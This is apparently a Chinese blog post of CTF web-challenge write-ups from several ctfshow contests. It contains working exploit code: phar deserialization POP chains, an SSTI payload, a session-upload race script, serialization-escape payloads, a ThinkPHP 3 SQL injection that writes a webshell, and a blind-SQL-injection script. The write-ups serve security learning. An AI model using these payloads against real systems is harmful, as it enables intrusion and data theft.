>首先在`readfile.php`处有读取文件的操作，不过过滤的很死，`php://`伪协议在这里用不了
这里可以用`phar://`伪协议，但是`phar://`不能出现在首部，可以利用`compress.zlib://` 或 `compress.bzip2://` 函数
php一大部分的[文件系统函数](https://www.php.net/manual/en/ref.filesystem.php)在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下
![](/bmth_blog/images/pasted-49.png)

首先分析class.php，需要构造pop链
```
__invoke(): 把实例对象当作函数方法调用时，会自动调用__invoke()方法
这里在Class B里的__toString()方法里的"($this->b)();"这句话实现了

__toString(): 打印一个对象的时被调用，如echo $obj;或print $obj
这里在class A里的__destruct()方法里有实现

__destruct(): 当删除一个对象或对象操作终止时被调用。
```
pop链实现如下：
```php
$o = new A('');
$o->a = new B('');
$o->a->b = new C('system("ls");');
```
最后的exp：
```php
<?php
error_reporting(0);
ini_set('phar.readonly','Off');

class A {
	public $a;
	public function __construct($a)
	{
		$this->a = $a;
	}
	public function __destruct()
	{
		echo "THI IS CTFSHOW".$this->a;
	}
}
class B {
	public $b;
	public function __construct($b)
	{
		$this->b = $b;
	}
	public function __toString()
	{
		return ($this->b)();
	}
}
class C{
	public $c;
	public function __construct($c)
	{
		$this->c = $c;
	}
	public function __invoke()
	{
		return eval($this->c);
	}
}

$o = new A('');
$o->a = new B('');
$o->a->b = new C('system("ls /");');

@unlink("phar.phar");								//unlink()函数删除文件
$phar = new Phar("phar.phar");						//后缀名必须为phar
$phar->startBuffering();							//开始缓冲phar写操作
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");//设置stub
$phar->setMetadata($o);								//将自定义的meta-data存入manifest
$phar->addFromString("text.txt", "test");			//添加要压缩的文件
$phar->stopBuffering();								//签名自动计算
?>
```
要将php.ini中的phar.readonly选项设置为Off，生成了phar.phar，改后缀为gif
然后上传phar.gif，查看文件处使用`compress.zlib://phar://upload/phar.gif`
![](/bmth_blog/images/pasted-50.png)
最后将命令改为读取即可得到flag


[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)
参考：
[ctfshow-1024杯](https://blog.csdn.net/hiahiachang/article/details/109283286)
[CTFshow 1024杯](https://lazzzaro.github.io/2020/10/25/match-CTFshow-1024%E6%9D%AF/)

## 原谅杯
### 原谅4
 ```php
  <?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__); 
 ```
 直接给出了源码，但发现读取不到flag，提示：
 >老前辈说过“最安全的系统就是什么都没有”，我把没用的命令都删了，看你还怎么执行
 >你知道系统环境变量里的PATH是干什么的吗？

那么输出看一下`echo $PATH`，发现
![](https://img-blog.csdnimg.cn/20210601204436637.png)
每个目录ls看一下，发现`ls /usr/local/bin`得到php，即可执行php语句，`ls /bin`得到 ls rm sh
#### 预期解
[linux shell中"2>&1"含义](https://www.cnblogs.com/zhenghongxin/p/7029173.html)
得到sh，那么就可以使用`sh /flag 2>1`，然后查看/1即可得到flag
![](https://img-blog.csdnimg.cn/20210601210224396.png)
也可以使用`sh /flag 2>&1`，直接输出错误了，注意&需要url编码
![](https://img-blog.csdnimg.cn/2021060121002752.png)
#### 非预期
由于存在php，那么就可以执行php语句了
```
方法一：php 文件，文件内容会被当成php代码执行，相当于是include
/?xbx=php /flag
方法二：使用空配置文件（默认配置）执行php代码
/?xbx=>php.ini
/?xbx=php -c php.ini -r "include('/flag');"
```

### 原谅5_fastapi2
首先`q=list(calc.__globals__)`查看当前的全局变量
![](https://img-blog.csdnimg.cn/20210601214813717.png)
发现一个youdontknow，查看一下`q=list(youdontknow)`
![](https://img-blog.csdnimg.cn/20210601215048850.png)
发现过滤了
```
['import', 'open', 'eval', 'exec', 'class', '\'', '"', 'vars', 'str', 'chr']
```
可以直接执行 `youdontknow.clear()` 来将列表置空
最后直接 `q=open("/flag").read()` 读取flag即可
![](https://img-blog.csdnimg.cn/20210601215246588.png)
也可以使用SSTI获取
```python
q=[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__import__']("os").__dict__['popen']("cat /flag").read()
```

### 原谅6_web3
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('waf.php');
$file = $_GET['file'] ?? NULL;
$content = $_POST['content'] ?? NULL;
(waf_file($file)&&waf_content($content))?(file_put_contents($file,$content)):NULL;
```
发现存在过滤，是一个file_put_contents写函数，经过测试发现没有过滤`.user.ini`，那么可以借助`.user.ini`轻松让所有php文件都"自动"包含某个文件，但content内容也被过滤了
我们可以利用`PHP_SESSION_UPLOAD_PROGRESS`文件包含，进行条件竞争，使用师傅的脚本
```python
# coding=utf-8
# Author：Y4tacker
import io
import requests
import threading

sessid = 'yyy'
url = "http://1cf33ddd-e48f-4764-99f2-55fcb8eac10a.challenge.ctf.show:8080/"


def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post(url,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': "<?php system('cat ./flag.php');?>"},
                            files={'file': ('yyy.txt', f)}, cookies={'PHPSESSID': sessid})


def read(session):
    while True:
        resp = session.get(url+"waf.php")
        if "upload_progress" in resp.text:
            print(resp.text)


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        # 第一步上传.user.ini文件，将我们的session文件内容添加到默认头
        y4tacker = {
            "content": "auto_prepend_file=/tmp/sess_" + sessid
        }
        session.post(url + "?file=.user.ini", data=y4tacker)
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()
```
![](https://img-blog.csdnimg.cn/20210602101528553.png)
参考：[[原谅杯]Web部分WP](https://y4tacker.blog.csdn.net/article/details/110001506)


## 大吉大利杯
### veryphp
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("config.php");
class qwq
{
    function __wakeup(){
        die("Access Denied!");
    }
    static function oao(){
        show_source("config.php");
    }
}
$str = file_get_contents("php://input");
if(preg_match('/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is',$str)){
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
if(isset($shaw_root)){
    if(preg_match('/^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){
        echo $hint;
    }else{
        echo "Almost there."."<br>";
    }
}else{
    echo "<br>"."Input correct parameters"."<br>";
    die();
}
if($ans===$SecretNumber){
    echo "<br>"."Congratulations!"."<br>";
    call_user_func($my_ans);
}
```
发现需要满足正则匹配，那么使用 [https://hiregex.com/](https://hiregex.com/) 调试
![](https://img-blog.csdnimg.cn/2021060213320152.png)
发现hackbar传参有问题，使用postman传参`shaw root=-a9<b>aaaaaaaa>>>>abcdphp@Rsa`
![](https://img-blog.csdnimg.cn/20210602133021881.png)
得到
```
Here is a hint : md5("shaw".($SecretNumber)."root")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5
```
发现需要爆破，写个脚本
```php
<?php
for($a=10000;$a<=99999;$a++){
    if(md5("shaw".$a."root")=='166b47a5cb1ca2431a0edfcef200684f')
        echo("get the number：".$a);
}
```
![](https://img-blog.csdnimg.cn/20210602173606989.png)
得到数字21475，最后通过`call_user_func()`调用`qwq::oao`即可得到config.php源码
![](https://img-blog.csdnimg.cn/20210602173823449.png)
最后发现还可以变量覆盖`&ans=1&SecretNumber=1`，将两个变量都设为1即可
![](https://img-blog.csdnimg.cn/20210602174121433.png)
### spaceman
给出了源码
```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
class spaceman
{
    public $username;
    public $password;
    public function __construct($username,$password)
    {
        $this->username = $username;
        $this->password = $password;
    }
    public function __wakeup()
    {
        if($this->password==='ctfshowvip')
        {
            include("flag.php");
            echo $flag;    
        }
        else
        {
            echo 'wrong password';
        }
    }
}
function filter($string){
    return str_replace('ctfshowup','ctfshow',$string);
}
$str = file_get_contents("php://input");
if(preg_match('/\_|\.|\]|\[/is',$str)){            
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
$ser = filter(serialize(new spaceman($user_name,$pass_word)));
$test = unserialize($ser);
?> 
```
#### 非预期
由于使用extract，直接变量覆盖了，但过滤了`_`，可以使用 `空格` 和 `[` 代替
```
pass word=ctfshowvip
pass[word=ctfshowvip
```
![](https://img-blog.csdnimg.cn/20210602104914576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
#### 预期
本题其实是一个反序列化逃逸的题，当$pass_word变量为`1";s:8:“password”;s:10:"ctfshowvip`时
![](https://img-blog.csdnimg.cn/20210602113709611.png)
得到反序列化内容
```
O:8:"spaceman":2:{s:8:"username";N;s:8:"password";s:34:"1";s:8:"password";s:10:"ctfshowvip";}
```
只要我们将`s:8:"password";s:34:"1`闭合到username即可，一共22个字符，把ctfshowup变成ctfshow逃逸2个字符，那么需要11个ctfshowup即可
```php
<?php
class spaceman
{
    public $username="ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup";
    public $password="1\";s:8:\"password\";s:10:\"ctfshowvip";

}
$a = new spaceman();
$a = serialize($a);
echo str_replace('ctfshowup','ctfshow',$a);
```
![](https://img-blog.csdnimg.cn/20210602114147556.png)
这一串正好108个字符，成功闭合，传入即可得到flag
![](https://img-blog.csdnimg.cn/20210602114504214.png)
### 虎山行
进入发现页面为空的，尝试文件泄露，最后发现为`www.rar`，得到源码，使用install.php安装
使用seay扫描一下，发现page-edit.php存在任意文件读取
![](https://img-blog.csdnimg.cn/20210602184203872.png)
尝试获取/flag发现
![](https://img-blog.csdnimg.cn/20210602184015467.png)
告诉我们需要访问ctfshowsecretfilehh
![](https://img-blog.csdnimg.cn/20210603213139222.png)
得到源码：
```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include('waf.php');
class Ctfshow{
    public $ctfer = 'shower';
    public function __destruct(){
        system('cp /hint* /var/www/html/hint.txt');
    }
}
$filename = $_GET['file'];
readgzfile(waf($filename));
?> 
```
发现要是触发了Ctfshow类就会得到hint.txt
存在一个waf.php，读取一下`mc-admin/page-edit.php?file=../../../ctfshowsecretfilehh/waf.php`
![](https://img-blog.csdnimg.cn/20210603213808894.png)
```php
<?php
function waf($file){
    if (preg_match("/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i",$file)){
        die("姿势太简单啦，来一点骚的？！");
    }else{
        return $file;
    }
}
```
发现过滤很多php伪协议，但可以使用压缩过滤器触发phar `zlib:phar://`
再来看发现有个上传点`/upload.php`，那么就可以使用phar了
```php
<?php
class Ctfshow{
    public $ctfer = 'shower';
}
$object = new Ctfshow();
$phar = new Phar("phar.phar");
$phar->startBuffering();  //开始写入
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");   //设置stub，增加gif文件头
$phar->addFromString('test.txt','test');   //添加要压缩的文件
$phar->setMetadata($object);  //将自定义的meta-data存入manifest
$phar->stopBuffering();
?>
```
将后缀改为.gif后上传，发现上传后文件名发生变化，读取一下upload.php
```php
<?php
error_reporting(0);
// 允许上传的图片后缀
$allowedExts = array("gif", "jpg", "png");
$temp = explode(".", $_FILES["file"]["name"]);
// echo $_FILES["file"]["size"];
$extension = end($temp);     // 获取文件后缀名
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/png"))
&& ($_FILES["file"]["size"] < 2048000)   // 小于 2000kb
&& in_array($extension, $allowedExts))
{
	if ($_FILES["file"]["error"] > 0)
	{
		echo "文件出错: " . $_FILES["file"]["error"] . "<br>";
	}
	else
	{
		if (file_exists("upload/" . $_FILES["file"]["name"]))
		{
			echo $_FILES["file"]["name"] . " 文件已经存在。 ";
		}
		else
		{
			$md5_unix_random =substr(md5(time()),0,8);
			$filename = $md5_unix_random.'.'.$extension;
            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
            echo "上传成功,文件存在upload/";
		}
	}
}
else
{
	echo "文件类型仅支持jpg、png、gif等图片格式";
}
?>
```
发现文件名是`substr(md5(time()),0,8);`，那么在火狐获取Date得到`Thu, 03 Jun 2021 14:04:42 GMT`
```php
<?php
$a='Thu, 03 Jun 2021 14:04:42 GMT';
echo substr(md5(strtotime($a)),0,8);
```
得到文件名，直接使用伪协议即可，`/ctfshowsecretfilehh/?file=zlib:phar:///var/www/html/upload/2104daf1.gif`，得到
>flag{fuckflag***}flag also not here You can access ctfshowgetflaghhhh directory

访问得到
```php
<?php
show_source(__FILE__);
$unser = $_GET['unser'];
class Unser {
    public $username='Firebasky';
    public $password;
    function __destruct() {
        if($this->username=='ctfshow'&&$this->password==(int)md5(time())){
            system('cp /ctfshow* /var/www/html/flag.txt');
        }
    }
}
$ctf=@unserialize($unser);
system('rm -rf /var/www/html/flag.txt');
```
发现password需要等于`(int)md5(time())`，那么使用python脚本即可，发现不需要条件竞争，这里还是学习了一下多线程的条件竞争
```python
import requests
import time
import hashlib
import _thread

url = 'http://5e6283fc-0b75-4f5b-8207-3f7dcb735c51.challenge.ctf.show:8080/ctfshowgetflaghhhh/'
url2 = 'http://5e6283fc-0b75-4f5b-8207-3f7dcb735c51.challenge.ctf.show:8080/flag.txt'

def write(threadName, delay):
    while True:
        number = str(int(time.time()))
        number = hashlib.md5(number.encode(encoding='UTF-8')).hexdigest()

        payload='?unser=O:5:"Unser":2:{s:8:"username";s:7:"ctfshow";s:8:"password";s:32:"'+number+'";}'
        r = requests.get(url=url+payload)

def readflag(threadName, delay):
    while True:
        r2 = requests.get(url2)
        if 'ctfshow{' in r2.text:
            print(r2.text)

try:
   _thread.start_new_thread( write, ("Thread-1", 4, ) )
   _thread.start_new_thread( readflag, ("Thread-2", 4, ) )
   
except:
   print ("Error: 无法启动线程")

while 1:
   pass
```

参考：
[ctfshow大吉大利杯Web题目Writeup](https://www.cnblogs.com/erR0Ratao/p/14322319.html)
[2021-DJBCTF(Web+Re+Crypto+Misc部分)](https://y4tacker.blog.csdn.net/article/details/113097738)


## F5杯
### lastsward's website
>flag不在数据库里，尝试写shell
1.sql查询语句是 select * from game where id = 1
2.游戏名和游戏id是一张表的不同字段
3.配合修改游戏名功能写shell

看起来不像sql注入，首先尝试弱密码发现admin，123456登录成功，看了wp才发现网站是TP3设计的，那么去找一下漏洞
这里其实删几个目录就会出来报错的
![](https://img-blog.csdnimg.cn/20210602192054364.png)
也存在目录泄露
![](https://img-blog.csdnimg.cn/20210602192256117.png)
[thinkphp 3.2.3 exp注入漏洞分析](https://zhuanlan.zhihu.com/p/127208753)
[Thinkphp3 漏洞总结](https://y4er.com/post/thinkphp3-vuln/)
尝试使用sleep，`?gameId[0]=exp&gameId[1]==2 and sleep(5)--+`，但发现被过滤了，写一个脚本来爆破一下过滤了哪些字符，发现load_file和outfile都被过滤了，但dumpfile未被过滤
```
/index.php/Home/Game/gameinfo/gameId/?gameId[0]=exp&gameId[1]==1 into dumpfile "/var/www/html/shell.php"--+
```
![](https://img-blog.csdnimg.cn/20210602195543149.png)
成功写入
最后将游戏名字修改为php一句话即可获取webshell
![](https://img-blog.csdnimg.cn/20210602200057264.png)
最后在phpinfo找到flag
![](https://img-blog.csdnimg.cn/20210602200324734.png)
### Web逃离计划 
登录失败提示不是sql，那么就是弱密码，使用burp爆破
![](https://img-blog.csdnimg.cn/20210602203157180.png)
成功得到密码为admin888，发现传输了一个`lookMe.php?file=logo.png`，很明显是文件包含
![](https://img-blog.csdnimg.cn/20210602203630638.png)访问`lookMe.php`可以得到源码
```php
 <?php

error_reporting(0);
if ($_GET['file']){
    $filename = $_GET['file'];
    if ($filename=='logo.png'){
        header("Content-Type:image/png");
        echo file_get_contents("./static/img/logo.png");
    }else{
        ini_set('open_basedir','./');
        if ($filename=='hint.php'){
            echo 'nononono!';
        } else{
            if(preg_match('/read|[\x00-\x2c]| |flag|\.\.|\.\//i', $filename)){
                echo "hacker";
            }else{
                include($filename);
            }
        }
    }
}else{
    highlight_file(__FILE__);
} 
```
过滤了read，但也可以实现读取，读取一下index.php
`php://filter/convert.base64-encode/resource=index.php`
![](https://img-blog.csdnimg.cn/20210602204916462.png)
```php
<?php
include "class.php";
include "ezwaf.php";
session_start();
$username = $_POST['username'];
$password = $_POST['password'];
$finish = false;
if ($username!=null&&$password!=null){
    $serData = checkLogData(checkData(get(serialize(new Login($username,$password)))));
    $login = unserialize($serData);
    $loginStatus = $login->checkStatus();
    if ($loginStatus){
        $_SESSION['login'] = true;
        $_COOKIE['status'] = 0;
    }
    $finish = true;
}
?>
```
发现存在class.php和ezwaf.php，依次读出源码
**class.php：**
```php
<?php
error_reporting(0);

class Login{
    protected $user_name;
    protected $pass_word;
    protected $admin;
    public function __construct($username,$password){
        $this->user_name=$username;
        $this->pass_word=$password;
        if ($this->user_name=='admin'&&$this->pass_word=='admin888'){
            $this->admin = 1;
        }else{
            $this->admin = 0;
        }
    }
    public function checkStatus(){
        return $this->admin;
    }
}


class register{
    protected $username;
    protected $password;
    protected $mobile;
    protected $mdPwd;

    public function __construct($username,$password,$mobile){
        $this->username = $username;
        $this->password = $password;
        $this->mobile = $mobile;
    }

    public function __toString(){
        return $this->mdPwd->pwd;
    }
}

class magic{
    protected $username;

    public function __get($key){
        if ($this->username!=='admin'){
            die("what do you do?");
        }
        $this->getFlag($key);
    }

    public function getFlag($key){
        echo $key."</br>";
        system("cat /flagg");
    }


}

class PersonalFunction{
    protected $username;
    protected $password;
    protected $func = array();

    public function __construct($username, $password,$func = "personalData"){
        $this->username = $username;
        $this->password = $password;
        $this->func[$func] = true;
    }

    public function checkFunction(array $funcBars) {
        $retData = null;

        $personalProperties = array_flip([
            'modifyPwd', 'InvitationCode',
            'modifyAvatar', 'personalData',
        ]);

        foreach ($personalProperties as $item => $num){
            foreach ($funcBars as $funcBar => $stat) {
                if (stristr($stat,$item)){
                    $retData = true;
                }
            }
        }


        return $retData;
    }

    public function doFunction($function){
        // TODO: 出题人提示：一个未完成的功能，不用管这个，单纯为了逻辑严密.
        return true;
    }


    public function __destruct(){
        $retData = $this->checkFunction($this->func);
        $this->doFunction($retData);

    }
}
```
**waf.php：**
```php
<?php
function get($data){
    $data = str_replace('forfun', chr(0)."*".chr(0), $data);
    return $data;
}

function checkData($data){
    if(stristr($data, 'username')!==False&&stristr($data, 'password')!==False){
        die("fuc**** hacker!!!\n");
    }
    else{
        return $data;
    }
}

function checkLogData($data){
    if (preg_match("/register|magic|PersonalFunction/",$data)){
        die("fuc**** hacker!!!!\n");
    }
    else{
        return $data;
    }
}
```
这里抄一下atao师傅的解释
>看到第一个get()函数时猜测反序列化逃逸，后面两个是过滤函数，`checkData($data)`函数中的`stristr()`函数对大小写敏感，如果是在反序列化逃逸的过滤可能存在绕过的方式**通过将字符串的s类型改为S，可以对十六进制进行解码**，`checkLogData($data)`中的`preg_match("/register|magic|PersonalFunction/",$data)`并没有**i模式**所以对大小写不敏感，类名可以通过改变大小写不影响

借个图来表示POP链的利用顺序
![](https://img-blog.csdnimg.cn/20210602213533868.png)
需要构造pop链，顺序为
```php
$a = new magic();
$b = new register('aaa','123456','1',$a);
$c = array($b);
$d = new PersonalFunction('aaa','123456',$c);
$e = new Login('aaa',$d);

echo serialize($e);
```
注意要修改一些值
![](https://img-blog.csdnimg.cn/20210602213119342.png)
![](https://img-blog.csdnimg.cn/20210602213218942.png)
![](https://img-blog.csdnimg.cn/20210602213319688.png)
运行得到：(由于是protected，需要手动添加\00)
```
O:5:"Login":3:{s:12:"\00*\00user_name";s:3:"aaa";s:12:"\00*\00pass_word";O:16:"PersonalFunction":3:{s:11:"\00*\00username";s:3:"aaa";s:11:"\00*\00password";s:6:"123456";s:7:"\00*\00func";a:1:{i:0;O:8:"register":4:{s:11:"\00*\00username";s:3:"aaa";s:11:"\00*\00password";s:6:"123456";s:9:"\00*\00mobile";s:1:"1";s:8:"\00*\00mdPwd";O:5:"magic":1:{s:11:"\00*\00username";s:5:"admin";}}}}s:8:"\00*\00admin";i:0;}
```
那么我们需要将pass_word设置成我们需要的：
```
s:12:"\00*\00pass_word";O:16:"PersonalFunction":3:{s:11:"\00*\00username";s:3:"aaa";s:11:"\00*\00password";s:6:"123456";s:7:"\00*\00func";a:1:{i:0;O:8:"register":4:{s:11:"\00*\00username";s:3:"aaa";s:11:"\00*\00password";s:6:"123456";s:9:"\00*\00mobile";s:1:"1";s:8:"\00*\00mdPwd";O:5:"magic":1:{s:11:"\00*\00username";s:5:"admin";}}}}
```
这里需要加个 `a";`好让username闭合
```php
$username = 'aaa';
$password = "a\";s:12:\"\00*\00pass_word\";O:16:\"PersonalFunction\":3:{s:11:\"\00*\00username\";s:3:\"aaa\";s:11:\"\00*\00password\";s:6:\"123456\";s:7:\"\00*\00func\";a:1:{i:0;O:8:\"register\":4:{s:11:\"\00*\00username\";s:3:\"aaa\";s:11:\"\00*\00password\";s:6:\"123456\";s:9:\"\00*\00mobile\";s:1:\"1\";s:8:\"\00*\00mdPwd\";O:5:\"magic\":1:{s:11:\"\00*\00username\";s:5:\"admin\";}}}}";
$aaa = new Login($username,$password);
print_r(serialize($aaa));
```
运行得到
![](https://img-blog.csdnimg.cn/20210602234943239.png)
我们需要将`";s:12:"\00*\00pass_word";s:302:"a` 吞噬掉，即逃逸掉30个字符，由于将`forfun`转成 `chr(0)."*".chr(0)`，也就是6个字符转成3个字符，那么需要10个forfun
最后还需要绕过过滤函数：
1. 通过将字符串的s类型改为S，可以对十六进制进行解码 ，来绕过对username和password的过滤
2. 通过大小写绕过类名的过滤

最终payload：
```
username=forfunforfunforfunforfunforfunforfunforfunforfunforfunforfun&password=a";S:12:"\00*\00pass_word";O:16:"personalFunction":3:{S:11:"\00*\00\75sername";S:3:"aaa";S:11:"\00*\00\70assword";S:6:"123456";S:7:"\00*\00func";a:1:{i:0;O:8:"Register":4:{S:11:"\00*\00\75sername";S:3:"aaa";S:11:"\00*\00\70assword";S:6:"123456";S:9:"\00*\00mobile";S:1:"1";S:8:"\00*\00mdPwd";O:5:"Magic":1:{S:11:"\00*\00\75sername";S:5:"admin";}}}}
```

### eazy-unserialize
给出了源码
```php
 <?php
include "mysqlDb.class.php";

class ctfshow{
    public $method;
    public $args;
    public $cursor;

    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
        $this->getCursor();
    }

    function getCursor(){
        global $DEBUG;
        if (!$this->cursor)
            $this->cursor = MySql::getInstance();

        if ($DEBUG) {
            $sql = "DROP TABLE IF  EXISTS  USERINFO";
            $this->cursor->Exec($sql);
            $sql = "CREATE TABLE IF NOT EXISTS USERINFO (username VARCHAR(64),
            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8";

            $this->cursor->Exec($sql);
            $sql = "INSERT INTO USERINFO VALUES ('CTFSHOW', 'CTFSHOW', 'admin'), ('HHD', 'HXD', 'user')";
            $this->cursor->Exec($sql);
        }
    }

    function login() {
        list($username, $password) = func_get_args();
        $sql = sprintf("SELECT * FROM USERINFO WHERE username='%s' AND password='%s'", $username, md5($password));
        $obj = $this->cursor->getRow($sql);
        $data = $obj['role'];

        if ( $data != null ) {
            define('Happy', TRUE);
            $this->loadData($data);
        }
        else {
            $this->byebye("sorry!");
        }
    }

    function closeCursor(){
        $this->cursor = MySql::destroyInstance();
    }

    function lookme() {
        highlight_file(__FILE__);
    }

    function loadData($data) {

        if (substr($data, 0, 2) !== 'O:') {
            return unserialize($data);
        }
        return null;
    }

    function __destruct() {
        $this->getCursor();
        if (in_array($this->method, array("login", "lookme"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        }
        else {
            $this->byebye("fuc***** hacker ?");
        }
        $this->closeCursor();
    }

    function byebye($msg) {
        $this->closeCursor();
        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }
}

class Happy{
    public $file='flag.php';

    function __destruct(){
        if(!empty($this->file)) {
            include $this->file;
        }
    }

}

function ezwaf($data){
    if (preg_match("/ctfshow/",$data)){
        die("Hacker !!!");
    }
    return $data;
}
if(isset($_GET["w_a_n"])) {
    @unserialize(ezwaf($_GET["w_a_n"]));
} else {
    new CTFSHOW("lookme", array());
} 
```
发现有很多代码，但仔细分析就会发现很简单，有个Happy类可以include文件，可以用php伪协议读取源码
```php
<?php
class Happy{
    public $file='php://filter/convert.base64-encode/resource=flag.php';

    function __destruct(){
        if(!empty($this->file)) {
            include $this->file;
        }
    }
}
$a= new Happy();
echo serialize($a);
```
得到payload：
`O:5:"Happy":1:{s:4:"file";s:52:"php://filter/convert.base64-encode/resource=flag.php";}`
![](https://img-blog.csdnimg.cn/2021060310501712.png)
解码发现flag在根目录，读取即可

### 迷惑行为大赏之盲注
>hint: 没有源码，没有备份文件，不需要爆破，不需要扫描器，瞎注吧。

在登录界面发现一直会报错，好像不能注入
![](https://img-blog.csdnimg.cn/20210603105449260.png)
发现忘记密码可以进行布尔盲注，写一波脚本
![](https://img-blog.csdnimg.cn/2021060310561535.png)
获取数据库的时候有个数据库读不出来，猜测就是flag存放的数据库，看wp发现竟然是中文，fxxk，使用16进制来读取
![](https://img-blog.csdnimg.cn/20210603115046626.png)
发现数据库为测试，那么依次爆出表名和列名，最后由于存在@关键字符，用反引号括起来
```python
import requests

url = "http://94696fea-d261-49bb-8159-d91d0fe09180.challenge.ctf.show:8080/forgot.php"
result = ''


#二分法读取
for x in range(1,300):
    high = 127
    low = 32
    mid = (low + high) // 2

    while high > low:
        
        #16进制获取数据库
        #payload = '1\' or ascii(substr((select hex(group_concat(schema_name)) from information_schema.schemata),%d,1))>%d#' % (x, mid)
        #获取表名,库名也可以16进制
        #payload = '1\' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'测试\'),%d,1))>%d#' % (x, mid)
        #获取字段
        #payload = '1\' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=0xe6b58be8af95 and table_name=\'15665611612\'),%d,1))>%d#' % (x, mid)
        #获取flag,存在中文需要hex,由于存在@关键字符，用``反引号括起来
        payload = '1\' or ascii(substr((select hex(group_concat(`what@you@want`)) from 测试.15665611612),%d,1))>%d#' % (x, mid)

        params = {
            'username':payload
        }
        response = requests.post(url, data=params)
        if b':P' in response.content:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result.lower())
```
![](https://img-blog.csdnimg.cn/20210603121414717.png)
最后16进制解码得到flag
![](https://img-blog.csdnimg.cn/2021060312115230.png)
参考：
[ctfshow-F5杯-WEB](https://www.cnblogs.com/fallingskies/p/14450219.html)
[F5杯 Web部分题目Writeup by atao](https://www.cnblogs.com/erR0Ratao/p/14439131.html)
[POP链+字符逃逸+stristr绕过](https://mp.weixin.qq.com/s/RiX2fftTNZgX8X9H12cA-A)